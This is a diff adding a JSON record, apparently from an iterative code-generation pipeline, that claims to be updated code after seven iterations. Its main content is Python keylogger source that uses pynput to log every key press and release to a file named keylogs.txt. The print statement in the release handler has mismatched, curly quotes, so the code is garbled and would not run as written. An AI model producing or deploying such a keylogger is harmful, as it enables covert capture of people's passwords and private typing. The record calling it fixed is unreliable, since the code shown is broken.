@@ -1,0 +1,8 @@
+{
+  "output": "import pynput\nfrom pynput.keyboard import Key, Listener\nimport logging\n\nlog_dir = \"keylogs.txt\"\nlogging.basicConfig(filename=log_dir, level=logging.DEBUG, format='%(message)s')\n\ndef on_press(key):\n    if key == Key.esc:\n        return False\n    logging.info(str(key))\n    print('Key {} pressed'.format(key))\n\ndef on_release(key):\n    if key == Key.esc:\n        return True\n    logging.info(str(key))\n    print(\"Key {}\\\" released\u201d.format(key))\n\nwith Listener(on_press=on_press, on_release=on_release) as listener:\n    listener.join()",
+  "notes": "Code updated",
+  "applied_fixes": [
+    "iteration6_issue1"
+  ],
+  "iterations": 7
+}
